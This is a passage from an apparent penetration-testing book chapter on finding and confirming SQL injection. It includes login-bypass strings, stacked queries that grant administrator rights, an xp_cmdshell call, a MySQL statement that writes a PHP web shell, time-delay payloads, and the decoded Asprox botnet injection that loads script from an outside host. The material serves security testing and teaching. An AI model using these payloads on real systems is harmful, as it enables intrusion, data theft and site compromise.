explained ear lier, we first start the finding process by injecting input that might trigger anomalies. in this case, we can assume that we are injecting a string field, so we need to make sure we inject single quotes. entering a single quote in the username field and clicking send returns the following error: error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ’’’ at line 1 the error indicates that the form is vulnerable to sql inje ction. the resultant sql statement given the preceding input is as follows: select ∗ from administrators where username = ’’’ and password = ’’; the syntax of the query is wrong due to the injected quote and the database throws an error, which the web serv er sends back to the client. once we identify the vulnerability, our goal in this scenario is to craft a valid sql statement which satisfies the conditions imposed by the application so that we can bypass the authentication control. in this case, we assume we are attacking a string value because a username is usually represented by a string and because injecting a quote returned an unclosed quotation mark error. due to these reasons we are going to inject ’ or ‘1’=’1 in the username field, leaving the passw ord blank. the entry will result in the following sql statement: select ∗ from administrators where username = ” or ‘1’=‘1’ and password = ”; this statement will not have the intended results. it will not return true for every field due to logical operator priority. and has a higher priority than or , and therefore we could rewrite the sql statement as follows to make it easier to understand: select ∗ from administrators where (username = ’’) or (‘1’=‘1’ and password = ’’); this is not what we wanted to do, as this will return only the rows in the administrators table that contain a blank username or password. we can change this behavior by adding a new or condition such as ’ or 1=1 or ’1’=’1: select ∗ from administrators where (username = ’’) or (1=1) or (‘1’=‘1’ and password = ’’); the new or condition makes the statement always return true, and therefore we might bypass the authentication process. in the previous section you saw how you could solve this scenario by terminat ing the sql statement; however, you might find a scenario where termination is not possible and the preceding technique is therefore necessary. some authentication mechanisms cannot be bypassed by returning every row in the administrators table, as we have done in these examples; they might require just one row to be returned. for those scenarios, you may want to try something such as admin’ and ’1’=’1’ or ’1’=’1 , resulting in the following sql code: select ∗ from administrators where username = ‘admin’ and 1=1 or ‘1’=‘1’ and password = ’’; the preceding statement will return only one row whose username equals admin. remember that in this case, you need to add two conditions; otherwise, the and password=’’ would come into play. we can also inject sql content in the password field, which can be easier in this instance. due to the nature of the statement we would just need to inject a true condition such as ‘ or ’1‘=’1 to craft the following query: select ∗ from administrators where username = ’’ and password = ’’ or ‘1’=‘1’; this statement will return all content from the administrators table, thereby successfully exploiting the vulnerability. table 2.1 provides you with a list of injection strin gs that you may need during the discovery and confirmation process of an inline injection in a string field. table 2.1 signatures for inline injection of strings testing string variations expected result s ’ error triggering. if successful, the database will return an error 1’ or ‘1’=’1 1’) or (‘1’=’1 always true condition. if successful, it returns every row in the table value’ or ‘1’=’2 value’) or (‘1’=’2 no condition. if successful, it returns the same result as the original value 1’ and ‘1’=’2 1’) and (‘1’=’2 always false condition. if successful, it returns no rows from the table 1’ or ‘ab’=‘a’+’b 1’) or (‘ab’=‘a’+’b microsoft sql server concatenation. if successful, it returns the same information as an always true condition 1’ or ‘ab’=‘a’’b 1’) or (‘ab’=‘a’’b mysql concatenation. if successful, it returns the same information as an always true condition 1’ or 1’) or oracle and postgresql concatenation. if successful, it returns testing string variations expected result s ‘ab’=‘a’||’b (‘ab’=‘a’||’b the same information as an always true condition as you can see, in this section we have covered the basics of inline string injection. all the examples shown in this section were select queries to clearly illustrate the results of the injections, however it is important to understand the consequences of injecting into other sql queries. imagine a typical password change functionality on the victim inc. website where the user has to enter their old password for confirmation, and supply a new one. the resulting query would be something like the following: update users set password = ‘new_password’ where username = ‘bob’ and password = ‘old_password’ now, i f bob discovers a sql injection issue affecting the old password field and injects ‘or ‘1’=’1 the resulting query would be: update users set password = ‘new_password’ where username = ‘bob’ and password = ‘old_password’ or ‘1’=‘1’ can you see the consequen ces of the attack? yes, you guessed right, the attack would update every single password in the users table to new_password and therefore users would not be able to log on to the application any more. it is very important to envisage and understand the code ran on the server, and any potential side effects your testing may have, in order to minimize the risks of the sql injection inference process. similarly, a ‘or ‘1’=’1 injection in a delete query could very easily delete all contents of the table, and the refore you will need to be very careful when testing this type of query. injecting numeric values inline in the previous section, you saw an example of string inline injection for bypassing an authentication mechanism. you will now see another example where you are going to perform a similar attack against a numeric value. users can log in to victim inc. and access their profile. they can also check messages sent to them by other users. each user has a unique identifier or uid which is used to uniquely identify each user in the system. the url for displaying the messages sent to our user has the following form at: http://www.victim.com/messages/list.aspx?uid=45 when testing the uid parameter sending just a single quote, we get the following error: http://www.victim.com/messages/list.aspx?uid=’ server error in ‘/’ application. unclosed quotation mark before the character string ‘ order by received;’. to gain more information about the query we can send the following request: http://www.victim.com/messages/list.aspx?uid=0 having 1=1 the response from the server is: server error in ‘/’ application. column ‘messages.uid’ is invalid in the select list because it is not contained in an aggregate function and there is no group by clause. based on the information retrieved, we can assert that the sql code running on the server side should look like this: select ∗ from messages where uid=[user entry] order by received; figure 2.12 shows the injection point, the sql statement creation, and the vulnerable parameter. figure 2.12 visual representation of a numeric injection note that injecting a number doesn’t require termi nating and commencing the single -quote delimiters. as i mentioned before, numeric values are handled by the database without delimiting quotes. in this example, we can directly inject after the uid parameter in the url. in this scenario, we have control over the messages returned from the database. the application doesn’t perform any sanitization in the uid parameter, and therefore we can interfere in the rows selected from the messages table. the method of exploitation in this scenario is to add an always true (or 1=1 ) condition, so instead of returning only the messages for our user, all of them are displayed. the url would be: http://www.victim.com/messages/list.aspx?uid=45 or 1=1 the result of the request would return messages to every user, as shown in figure 2.13. figure 2.13 exploitation of a numeric injection the result of the exploitation generated the following sql statement: select ∗ from messages where uid=45 or 1=1 /∗ always true condition ∗ / order by received; due to the always true condition injected ( or 1=1) the database returns all rows in the messages table and not just the ones sent to our user. in cha pter 4 , you will learn how to exploit this further to read arbitrary data from any table of the database and even from other databases. table 2.2 shows a collection of signatures for testing numeric values. table 2.2 signatures for inline injection of numeric values testing string variations expected result s ’ error triggering. if successful, the database will return an error testing string variations expected result s 1+1 3-1 if successful, it returns the same value as the result of the operation value + 0 if successful, it returns the same value as the original request 1 or 1=1 1) or (1=1 always true condition. if successful, it returns every row in the table value or 1=2 value) or (1=2 no condition. if successful, it returns the same result as the original value 1 and 1=2 1) and (1=2 always false condition. if successful, it returns no rows from the table 1 or ‘ab’= ‘a’+‘b’ 1) or (‘ab’ = ‘a’+‘b’ microsoft sql server concatenation. this injection is valid for microsoft sql server. if successful, it returns the same information as an always true condition 1 or ‘ab’=‘a’’b’ 1) or (‘ab’=‘a’ ‘b mysql concatenation. if successful, it returns the same information as an always true condition 1 or ‘ab’=‘a’||‘b’ 1) or (‘ab’=‘a’||‘b’ oracle and postgresql concatenation. if successful, it returns the same information as an always true condition as you can see from table 2.2 , all the injection strings follow similar principles. confirming the existence of a sql injection vulnerability is just a matter of understanding what is being executed at server -side and i njecting the conditions that you need for each particular case. terminating sql injection there are several techniques for confirming the existence of sql injection vulnerabilities. in the previous section you saw inline injection techniques, and in this s ection you will see how to create a valid sql statement through its termination. injection -terminating a sql statement is a technique whereby the attacker injects sql code and successfully finalizes the statement by commenting the rest of the query, which would be otherwise appended by the application. figure 2.14 shows a diagram introducing the concept of sql injection termination. figure 2.14 terminating sql injection in figure 2.14, you can see that the injected code terminates the sql statement. apart from terminating the statement we need to comment out the rest of the query such that it is not executed. database comment syntax as you can see in figure 2.14, we need some means to prevent the end of the sql code from being executed. the element we are going to use is database comments . comments in sql code are similar to comments in any other programming language. they are used to insert informa tion in the code and they are ignored by the interpreter. table 2.3 shows the syntax for adding comments in microsoft sql server, oracle, mysql and postgresqldatabases. tip a defense technique consists of detecting and removing all spaces or truncating the value to the first space from the user entry. multiline comments can be used to bypass such restrictions. say you are exploiting an application using the following attack: http://www.victim.com/messages/list.aspx?uid=45 or 1=1 however, the application removes the spaces and the sql statement becomes: select ∗ from messages where uid=45or1=1 this will not return the results you want, but you can add multiline comments with no content to avoid using spaces: http://www.victim.com/messages/list.aspx?uid=45/ ∗∗/or/∗∗/1=1 the new query will not have spaces in the user input, but it will be valid, returning all of the rows in the messages table. the “evading input filters” section in chapter 7 explains in detail this technique and many others used for signature evasion. table 2.3 database comments database comment observation s microsoft sql server, oracle and postgresql -- (double dash) used for single -line comments /∗ ∗/ used for multiline comments mysql -- (double dash) used for single -line comments. it requires the second dash to be followed by a space or a control character such as tabulation, newline, etc. # used for single -line comments /∗ ∗/ used for multiline comments the following technique to confirm the existence of a vulnerability makes use of sql comments. have a look at the following request: http://www.victim.com/messages/list.aspx?uid=45/ ∗hello∗/ if vulnerable, the application will send the value of the uid followed by a comment. if there are no problems processing the request and we get the same result we would get with uid=45, this means the database ignored the content of the comment. this might be due to a sql injection vulnerability. using comments let’s see how we can use comments to terminate sql statements. we are going to use the authentication mechanism in the victim inc. administration web site. figure 2.15 represents the concept o f terminating the sql statement. figure 2.15 exploitation terminating sql statement in this case, we are going to exploit the vulnerability terminating the sql statement. we will only inject code into the username field and we will terminate the statement. we will inject the code ‘ or 1=1; --, which will create the following statement: select ∗ from administrators where username = ’’ or 1=1;-- ‘ and password = ’’; this statement will return all rows in the administrators table due to the 1=1 condition. moreover, it will ignore the part of the query after the comment, so we don’t have to wor ry about the and password=’’ . you can also impersonate a known user by injecting admin’; --. this will create the following statement: select ∗ from administrators where username = ‘admin’;-- ‘ and password = ’’; this statement will return only one row cont aining the admin user successfully bypassing the authentication mechanism. you may find scenarios where a double hyphen ( --) cannot be used because it is filtered by the application or because commenting out the rest of the query generates errors. in such cases, you can use multiline comments (/∗∗/) for commenting parts of the sql statement. this technique requires more than one vulnerable parameter and an understanding of the position of the parameters in the sql statement. figure 2.16 shows an example of a multiline comment attack. note that the text in the password field is disclosed for clarity. it illustrates an attack using multiline comments. figure 2.16 using multiline comments in this attack, we use the username field to select the user we want and start the comment with the /∗ sequence. in the passwo rd field we finish the comment ( ∗/) and we add the single quote sequence to end the statement syntactically correct with no effect on the result. the resultant sql statement is: select ∗ from administrators where username = ‘admin’/∗ ‘ and password = ’ ∗/ ’’; removing the commented code helps to better illustrate the example: select ∗ from administrators where username = ‘admin’’’; as you can see, we needed to finish the statement with a string due to the last single quote inserted by the application which we cannot control. we chose to concatenate an empty string, which has no effect on the result of the query. in the previous example, we concatenated our input with an empty string. string concatenation is something you will always need when doing sql injection testing. however, because it is done differently in sql server, mysql, oracle, and postgresql it can therefore be used as a tool to identify the remote database. table 2.4 shows the concatenation operators in each d atabase. table 2.4 database concatenation operators database concatenation microsoft sql server ‘a’ + ‘b’ = ‘ab’ mysql ‘a’ ‘b’ = ‘ab’ database concatenation oracle and postgresql ‘a’ || ‘b’ = ‘ab’ if we find a parameter in a web application which is vulnerable but we are unsure of the remote database server, we can use string concatenation techniques for identification. remote database identification can be done by replacing any vulnerable string pa rameter with a concatenation in the following manner: http://www.victim.com/displayuser.aspx?user=bob -- original request http://www.victim.com/displayuser.aspx?user=b’+’ob -- mssql http://www.victim.com/displayuser.aspx?user=b’’ob -- mysql http://www.victim.com/displayuser.aspx?user=b’||’ob -- oracle or postgresql sending the three modified requests will tell you the database running on the remote backend server, as two requests will return a syntax error and one of them will return the same result as the original request indicating the underlying database. table 2.5 shows a summary with some signatures using database comments commonly used for bypassing authentication mechanisms. table 2.5 signatures using database com ments testing string variations expected result s admin’ -- admin’) -- bypass authentication mechanism by returning the admin row set from the database admin’ # admin’)# mysql —bypass authentication mechanism by returning the admin row set from the database testing string variations expected result s 1-- 1)-- commenting out the rest of the query, it is expected to remove any filter specified in the where clause after the injectable parameter 1 or 1=1-- 1) or 1=1-- return all rows injecting a numeric parameter ‘ or ‘1’=’1’-- ‘) or ‘1’=’1’-- return all rows injecting a string parameter -1 and 1=2-- -1) and 1=2- return no rows injecting a numeric parameter ‘ and ‘1’=’2’ - ‘) and ‘1’=’2’-- return no rows injecting a string parameter 1/∗comment∗/ comment injection. if successful, it makes no difference to the original request. helps identify sql injection vulnerabilities executing multiple statements terminating a sql statement provides you with greater control over the sql code sent to the database server. in fact, this control goes beyond the statement created by the database. if you terminate the sql statement you can create a brand -new one with no restrictions on i t. microsoft sql server 6.0 introduced server -side cursors to its architecture, which provided the functionality of executing a string with multiple statements over the same connection handle. this functionality is also supported in all the later versions and allows the execution of statements such as the following: select foo from bar; select foo2 from bar2; the client connects to the sql server and sequentially executes each statement. the database server returns to the client as many result sets as statemen ts were sent. this is also supported in postgresql databases. mysql has also introduced this functionality in version 4.1 and later; however, this is not enabled by default. oracle databases don’t support multiple statements in this way, unless using pl/sq l. the exploitation technique requires that you are able to terminate the first statement, so you can then concatenate arbitrary sql code. this concept can be exploited in a number of ways. our first example will target an application connecting to a sql s erver database. we are going to use multiple statements to escalate privileges within the application —for example, by adding our user to the administrators group. our goal will be to run an update statement for that: update users/∗ update table users ∗/ set isadmin=1/ ∗ add administrator privileges in the application ∗ / where uid=<your user id> /∗ to your user ∗ / we need to start the attack, enumerating columns using the having 1=1 and group by technique explained before: http://www.victim.com/welcome.aspx?user=45; select ∗ from usershaving 1=1;-- this will return an error with the first column name and will need to repeat the process, adding the names to the group by clause: http://www.victim.com/welcome.aspx?user=45;select ∗ from users having 1=1group by uid; -- http://www.victim.com/welcome.aspx?user=45;select ∗ from users having 1=1group by uid, user;-- http://www.victim.com/welcome.aspx?user=45;select ∗ from users having 1=1group by uid, user, password;-- http://www.victim.com/welcome.aspx?user=45;select ∗ from users having 1=1group by uid, user, password, isadmin; -- once we discover the column names, the next url with the injected code to add administrative privileges to the victim inc. web application would be: http://www.victim.com/welcome.aspx?uid=45;update users set isadmin=1 where uid=45; -- warning be very careful when escalating privileges by executing an update statement, and always add a where clause at the end. don’t do something like this: http://www.victim.com/welcome.aspx?uid=45; update users set isadmin=1 as that would update every record in the users table, which is not what we want to do. having the possibility of executing arbitrary sql code offers many vectors of attack. you may opt to add a new user: insert into administrators (username, password) values (‘hacker’, ‘mysecretpassword’) the idea is that depending on the application, you can execute the appropriate statement. however, you will not get the results for the query if you execute a select , as the web server will read only the first record set. in chapter 5 you will learn techniques for appending data to the existing results using union statements. additionally, you have the ability (given the database user has enough permissions) to interact with the operating system, such as to read and write files, and execute operating system commands. these types of attack are explained in detail in chapter 6 , and are good examples of typical uses of multiple statements: http://www.victim.com/welcome.aspx?uid=45;exec master..xp_cmdshell ‘ping www.google.com’;-- we are now going to explore similar techniques using multiple sql statements in mysql databases (if multiple statements functionality is enabled). the technique and functionality are exactly the same and we will have to terminate the first query and execute arbitrary code in the second. for this example, our code of choice for the second statement is: select ‘<?php echo shell_exec($_get[“cmd”]);?>’ into outfile ‘/var/www/victim.com/shell.php’;-- this sql statement outputs the string ‘<?php echo shell_exec($_get[“cmd”]);?>’ into the /var/www/victim.com/shell.p hp file. the string written to the file is a php script that retrieves the value of a get parameter called cmd and executes it in an operating system shell. the url conducting this attack would look like this: http://www.victim.com/search.php?s=test’;select ‘<?php echo shell_exec($_get[“cmd”]);?>’ into outfile ‘/var/www/victim.com/shell.php’;-- provided mysql is running on the same server as the web server and the user running mysql has enough permissions, and the server has multiple statements enabled, the preceding command should have created a file in the web root which allows arbitrary command execution: http://www.victim.com/shell.php?cmd=ls you will learn more about exploiting this kind of issue in chapter 6 . for n ow, the important thing is that you learn the concept and the possibilities of running arbitrary sql code in multiple statements. table 2.6 shows signatures used for injecting multiple statements . notes from the underg round... use of sql injection by the asprox botnet a botnet is a large network of infected computers normally used by criminals and organized crime entities to launch phishing attacks, send spam e -mails, or launch distributed denial of service (dos) attacks. newly infected computers become part of the botnet which is controlled by a master server. there are several modes of infection, one of the most common being the exploitation of web browser vulnerabilities. in this scenario, the victim opens a web page served by a malicious web site which contains an exploit for the victim’s browser. if the exploit code is executed successfully the victim is infected. as a consequence of this method of infection, it is not a surprise that botnet owners are always looking f or target web sites to serve their malicious software. the asprox trojan was primarily designed to create a spam botnet dedicated to sending phishing e -mails. however, during may 2008 all the infected systems in the botnet received an updated component in a file called msscntr32.exe. this file is a sql injection attack tool which is installed as a system service under the name of “microsoft security center extension.” once the service is running, it uses the google search engine to identify potential victim s by identifying hosts running .asp pages with get parameters. the infecting code terminates the current statements and appends a new one as you just saw in this chapter. let’s have a look at the infecting url: http://www.victim.com/vulnerable.asp?id=425;declare @s varchar(4000);set @s=cast(0x4445434c4152452040542056415243 <snip> 434c415245202075f437572736f72 as varchar(4000));exec(@s);-- [shortened for brevity] the following is the unencoded and commented code that performs the attack: declare @t varchar(255),/ ∗ variable to store the table name ∗/ @c varchar(255)/ ∗ variable to store the column name ∗/ declare table_cursor cursor /∗ declares a db cursor that will contain ∗/ for /∗ all the table/column pairs for all the ∗/ select a.name,b.name/ ∗ user created tables and ∗/ from sysobjectsa,syscolumns b /∗ columns typed text(35), ntext (99), varchar(167) ∗/ /∗ orsysname(231) ∗/ where a.id=b.id and a.xtype=‘u’ and (b.xtype=99 or b.xtype=35 or b.xtype=231 or b.xtype=167) open table_cursor / ∗ opens the cursor ∗/ fetch next from table_cursor into @t, @c /∗ fetches the first result ∗/ while(@@fetch_status=0) / ∗ enters in a loop for every row ∗ /begin exec(‘ update [’ +@t+’] set /∗ updates every column and appends ∗/ [‘+@c+’]=rtr im(convert(varchar(8000),[’+@c+’]))+ /∗ a string pointing to a malicious ∗/ “<scriptsrc=http://www.banner82.com/b.js></script>’’’) /∗ javascript file ∗/ fetch next from table_cursor into @t,@c /∗ fetches next result ∗/ end close table_cursor / ∗ closes the cursor ∗/ deallocate table_cursor/ ∗ deallocates the cursor ∗/ the code updates the content of the database appending a <script> tag. if any of the contents are shown in a web page (which is very likely), the visitor will lo ad the contents of the javascript file into the browser. the purpose of the attack is to compromise web servers and modify the legitimate html code to include a javascript file which contained the necessary code to infect more vulnerable computers and cont inue to grow the botnet. if you want more information about asprox, visit the following urls: • www.toorcon.org/tcx/18_brown.pdf • xanalysis.blogspot.com/2008/05/asprox -trojan -and-banner82com.html table 2.6 signatures for executing multiple statements testing string variations expected result s ’;[sql statement]; -- ’);[sql statement]; -- execution of multiple statements injecting a string parameter ’;[sql statement];# ’);[sql statement];# mysql —execution of multiple statements injecting a string parameter (if enabled on database) ;[sql statement]; -- );[sql statement]; -- execution of multiple statements injecting a numeric parameter ;[sql statement];# );[sql statement];# mysql —execution of multiple statements injecting a numeric parameter (if enabled on database) time delays when testing applications for sql injection vulnerabilities you will often find yourself with a potential vulnerability that is d ifficult to confirm. this can be due to a number of reasons, but mainly because the web application is not showing any errors and because you cannot retrieve any data. in this kind of situation, it is useful to inject database time delays and check whether the response from the server has also been delayed. time delays are a very powerful technique as the web server can hide errors or data, but cannot avoid waiting for the database to return a result, and therefore you can confirm the existence of sql injec tion. this technique is especially useful in blind injection scenarios. microsoft sql servers have a built -in command to introduce delays to queries: waitfor delay ‘hours:minutes:seconds’ . for example, the following request to the victim inc. web server takes around 5 s: http://www.victim.com/basket.aspx?uid=45;waitfor delay ‘0:0:5’;-- the delay in the response from the server assures us that we are injecting sql code into the back -end dat abase. mysql databases don’t have an equivalent to the waitfor delay command. however, it is possible to introduce a delay using functions which take a long time to operate. the benchmark function is a good option. the mysql benchmark function executes an expression a number of times. it is used to evaluate the speed of mysql executing expressions. the amount of time required by the database varies depending on the workload of the server and the computing resources; however, provided the delay is noticeable , this technique can be used for identification of vulnerabilities. let’s have a look at the following example: mysql> select benchmark(10000000,encode(‘hello’,‘mom’)); +---------------------------------------------- + | benchmark(10000000,encode(‘hello’,‘m om’)) | +---------------------------------------------- + | 0 | +---------------------------------------------- + 1 row in set (3.65 sec) it took 3.65 s to execute the query, and therefore if we inject this code into a sql injection vulnerability it will del ay the response from the server. if we want to delay the response further, we just need to increment the number of iterations. here is an example: http://www.victim.com/display.php?id=32; select benchmark(10000000,encode(‘hello’,‘mom’)); -- in oracle pl/sql , it is possible to create a delay using the following set of instructions: begin dbms_lock.sleep(5); end; the dbms_lock.sleep() function puts a procedure to sleep for a number of seconds; however, a number of restrictions apply to this function. the first one is that this function cannot be injected directly into a subquery, as oracle doesn’t support stacked queries. second, the dbms_lock package is available only for database administrators. a better approach in oracle pl/sql, which allows inline injectio n uses the following set of instructions: http://www.victim.com/display.php?id=32 or 1=dbms_pipe.receive_message(‘rds’, 10) the function dbms_pipe.receive_message is waiting 10 s for data from the pipe rds. the package is granted to public by default. in opposite to procedures like dbms_lock.sleep() a function can be used in a sql statement. on recent postgresql databases (8.2 and up), the pg_sleep function can be used to induce delays: http://www.victim.com/display.php?id=32; select pg_sleep(10);-- the “us ing time -based techniques” section in chapter 5 discusses exploitation techniques where time is involved. automating sql injection discovery so far in this chapter, you have seen techniques for manually finding sql inj ection vulnerabilities in web applications. you saw that the process involves three tasks: • identifying data entry • injecting data • detecting anomalies from the response in this section, you will see that you can automate the process to a certain extent, but there are some issues that an application needs to deal with. identifying data entry is something that can be automated. it is just a matter of crawling the web site a nd finding get and post requests. data injection can also be done in an automatic fashion, as all the necessary data for sending the requests has been obtained in the previous phase. the main problem with automatically finding sql injection vulnerabilities comes with detecting an omalies from the response of the remote server. although it is very easy for a human to distinguish an error page or another kind of anomaly, it is sometimes very difficult for a program to understand the output from the server. in some occasions, an appli cation can easily detect that a database error has occurred: • when the web application returns the sql error generated by the database • when the web application returns an http 500 error • some cases of blind sql injection however, in other scenarios an application will find it hard to identify an existing vulnerability and will possibly miss it. for that reason, it is important to understand the limitations of automating sql injection discovery and the importance of manual testing. moreover, there is yet another variable when testing for sql injection vulnerabilities. applications are coded by humans, and at the end of the day bugs are coded by humans. when you look at a web application you can perceive where the potential vulnerabilities might be, guided by your instinct and your experience. this happens because you can understand the application which is something that an automated tool is not able to do. a human can easily spot a part of a web application which is not fully implemented, maybe just readi ng a “beta release—we are still testing” banner in the page. it seems apparent that you may have better chances of finding interesting vulnerabilities there than testing mature code. additionally, your experience tells you what part of the code might have been overlooked by the programmers. for example, there are scenarios where most of the input fields may be validated if they require direct entry from the user. however, those which are a result of another process, dynamically written to the page (where th e user can manipulate them) and then reused in the sql statements, tend to be less validated as they are supposed to come from a trusted source. on the other hand, automated tools are systematic and thorough. they don’t understand the web application logic , but they can test very quickly a lot of potential injection points which is something that a human cannot do thoroughly and consistently. tools for automatically finding sql injection in this section, i will show you some commercial and free tools design ed to find sql injection vulnerabilities. tools exclusively focused on exploitation will not be presented in this chapter. hp webinspect webinspect is a commercial tool by hewlett- packard. although you can use it as a sql injection discovery tool, the real purpose of this tool is to conduct a full assessment of the security of a web site. this tool requires no technical knowledge and runs a full scan, testing for misconfigurations and vulnerabilities at the application server and web application layers. figure 2.17 shows the tool in action. figure 2.17 hp webinspect webinsp ect systematically analyzes the parameters sent to the application, testing for all kinds of vulnerabilities including cross -site scripting (xss), remote and local file inclusion, sql injection, operating system command injection, and so on. with webinspec t you can also simulate a user authentication or any other process by programming a macro for the test. this tool provides four authentication mechanisms: basic, ntlm, digest, and kerberos. webinspect can parse javascript and flash content and it is capabl e of testing web 2.0 technologies. in regard to sql injection, it detects the value of the parameter and modifies its behavior depending on whether it is string or numeric. table 2.7 shows the injection strings sent by webinspect for identification of sql injection vulnerabilities. table 2.7 signatures used by webinspect for sql injection identification testing string s ’ value’ or value’ or 5=5 or ‘s’=’0 value’ and 5=5 or ‘s’=’0 value’ or 5=0 or ‘s’=’0 value’ and 5=0 or ‘s’=’0 0+value value and 5=5 value and 5=0 value or 5=5 or 4=0 value or 5=0 or 4=0 webinspect comes with a tool called sql injector which you can use to exploit the sql injection vulnerabilities discovered during the scan. sql injector has the option of retrieving data from the remote database and showing it to the user in a graphical fo rmat. • url: www8.hp.com/us/en/software/software -solution.html?compuri=tcm:245- 936139 • supported platforms: microsoft windows xp professional sp3, windowsserver2003 sp2, windows vista sp2, windows 7 and windows server 2008 r2 • requirements: microsoft .ne t 3.5 sp1, microsoft sql server or microsoft sql server express edition • price: contact vendor for a quote ibm rational appscan appscan is another commercial tool used for assessing the security of a web site, which includes sql injection assessment funct ionality. the application runs in a similar manner to webinspect, crawling the targeted web site and testing for a large range of potential vulnerabilities. the application detects regular sql injection and blind sql injection vulnerabilities, but it doesn ’t include a tool for exploitation as does webinspect. table 2.8 shows the injection strings sent by appscan during the inference process. table 2.8 signatures used by appscan for sql injection identification appscan also provides macro recording functionality to simulate user behavior and enter authentication credentials. the platform supports basic http and ntlm authentication as well as client -side certificates. appscan offers a very interesting functionality called a privilege escalation test. essentially, you can conduct a test to the same target using different privilege levels —for example, unauthenticated, read -only, and administrator. after that, appscan will try to access from a low-privileged account information available only for higher -privileged accounts, flagging any potential privilege escalation issue. figure 2.18 shows a screenshot of appscan during the scanning process. • url: www.ibm.com/software/awdtools/appscan/ • supported platforms: microsoft windows xp professional sp2, windows server 2003, windows vista, windows 7, and windows server 2008 and 2008 r2 • requirements: microsoft .net 2.0 or 3.0 (for some optional additional functionality) • price: contact vendor for a quote figure 2.18 ibm rational appscan hp scrawlr scrawlr is a free tool developed by the hp web security research group. scrawlr crawls the url specified and analyzes the parameters of each web page for sql injection vulnerabilities. http crawling is the action of retrieving a web page and identifying the web links contained on it. this action is repeated for each i dentified link until all the linked content of the web site has been retrieved. this is how web assessment tools create a map of the target web site and how search engines index contents. during the crawling process web assessment tools also store parameter information for later testing. after you enter the url and click start , the application crawls the target web site and performs the inference process for discovering sql injection vulnerabilities. when finished it shows the results to the user, as shown in figure 2.19. figure 2.19 hp scrawlr this tool requires no te chnical knowledge; the only information you need to enter is the domain name you want to test. you cannot test a specific page or folder as the tool starts crawling the web site from the root folder, so if the page that you want to test is not linked to any other page the crawling engine will not find it and it will not be tested. scrawlr only tests get parameters, and therefore all the forms in the web site will remain untested, which renders the result incomplete. here is a list of scrawlr limitations: • maximum of 1,500 crawled urls • no script parsing during crawl • no flash parsing during crawl • no form submissions during crawl (no post parameters) • only simple proxy support • no authentication or login functionality • does not check for blind sql inj ection during the inference process scrawlr sends only three injection strings, shown in table 2.9. table 2.9 signatures used by scrawlr for sql injection identification testing string s value’ or value’ and 5=5 or ‘s’=’0 number -0 scrawlr only detects verbose sql injection errors where the server returns an http 500 code page with the returned error message from the database. • url: https://h30406.www3.hp.com/campaigns/2008/wwcampaign/1- 57c4k/index.php • supported platform: microsoft windows • price: free sqlix sqlix is a free perl application coded by cedric cochin. it is a scanner that is able to crawl web sites and detect sql injection and blind sql injection vulnerabilities. figure 2.20 shows an example. figure 2.20 sqlix in figure 2.20, sqlix is crawling and testing victim inc.’s web site: perl sqlix.pl crawl=“ http://www.victim.com/” -all -exploit as you can see from the screenshot, sqlix crawled victim inc.’s web site and automatically discovered several sql injection vulnerabilitie s. however, the tool missed a vulnerable authentication form even when it was linked from the home page. sqlix does not parse html forms and automatically sends post requests. sqlix provides the possibility of testing only one page (with the –url modifier) or a list of urls contained in a file (the –file modifier). other interesting options include –referer , – agent , and –cookie to include the referer, user -agent, and cookie headers as a potential injection vector. table 2.10 shows the injection strings sqlix uses during the inference process. • url: www.owasp.org/index.php/category:owasp_sqlix_project • supported platform: platform -independent, c oded with perl • requirement: perl • price: free table 2.10 signatures used by sqlix for sql injection identification paros proxy/zed attack proxy paros proxy is a web assessment tool primarily used for manually manipulating web traffic. it acts as a proxy and traps the requests made from the web browser , allowing manipulation of the data sent to the server. the free version of paros proxy is no longer maintained, however a fork of the original called zed attack proxy (zap) is available. paros and zap also have a built -in web crawler, called a spider. you just have to right -click one of the domains displayed on the sites tab and click spider . you can also specify a folder where the crawling process will be executed. when you click start the tool will begin the crawling process. now you should have all the discovered files under the domain name on the sites tab. you just need to select the domain you want to test and click analyse | scan . figure 2.21 shows the execution of a scan against victim inc.’s web site. figure 2.21 paros proxy the identified security issues are displayed in the lower pane under the alerts tab. paros proxy and zap test get and post requests. moreover, it supports blind sql injection discovery, which makes it a good candidate among the free software alternatives. table 2.11 shows a list of the testing strings the tool uses. • url: paros —www.parosproxy.org/ • url: zap —www.owasp.org/index.php/owasp_zed_attack_proxy_project • supported platform: platform -independent, coded with java • requirement: java runtime environment (jre) 1.4 (or later) • price: free table 2.11 signatures used by paros proxy for sql injection identification summary the first step for successful sql i njection exploitation is to find the vulnerable piece of code which will allow you to perform the injection. in this chapter, i covered the process of finding sql injection vulnerabilities from a black -box perspective, explaining the steps that you need to take. web applications are an example of client/server architecture where the browser is the client and the web application is the server. you learned how you can manipulate the data sent from the browser to the server in order to trigger sql errors and i dentify vulnerabilities. depending on the web application and the amount of information leaked, the process of identifying a vulnerability varies in complexity. in some scenarios, the application responds to the web request with the error returned from the database. however, there are scenarios where you will need to pay attention to details to identify the vulnerability. once you identify a vulnerability and you have evidence that you can inject sql code using the web application input, you need to craft a sql snippet that will become a syntactically correct statement. there are several techniques for doing this, including injecting the code inline where all of the code of the original statement is executed, and commenting parts of the query to avoid execut ion of the full statement. the success of this phase will prepare you for further exploitation. a number of commercial and free tools automate the process of finding sql injection vulnerabilities. although they are all able to detect simple vulnerabilities where the application returns a standard sql error, they provide varying degrees of accuracy when it comes to other scenarios such as custom errors. additionally, the free tools generally focus on testing only get requests, leaving the remaining post requ ests untested. solutions fast track finding sql injection • there are three key aspects for finding sql injection vulnerabilities: (1) identifying the data entry accepted by the application, (2) modifying the value of the entry including hazardous strings, and (3) detecting the anomalies returned by the server. • manipulation tools acting as a web proxy help to bypass client -side restrictions, providing full control of the requests sent to servers. additionally, they offer greater visibility of the response from the server, providing greater chances of detecting subtle vulnerabilities that could remain undetected if visualized in the web browser. • a response of the server which includes a database error or that is an http error code usually eases the identi fication of the existence of a sql injection vulnerability. however, blind sql injection is something that can also be exploited, even if the application doesn’t return an obvious error. confirming sql injection • to confirm a sql injection vulnerability a nd in prevision for later exploitation you need to craft a request that injects sql code such that the application creates a syntactically correct sql statement that is in turn executed by the database server without returning any errors. • when creating a syntactically correct statement you may be able to terminate it and comment out the rest of the query. in these scenarios, and provided that the back -end database supports multiple statements, you usually can chain arbitrary sql code with no restrictions, providing you with the ability to conduct attacks such as privilege escalation. • sometimes the application will not reply with any visual sign of the injection attempts. in such cases, you can confirm the injection by introducing a delay in the reply from the database. the application server will wait for the database to reply and you will be able to verify whether a vulnerability exists. in this scenario, you need to be aware that network and server workloads might interfere slightly with your delays. automating sql 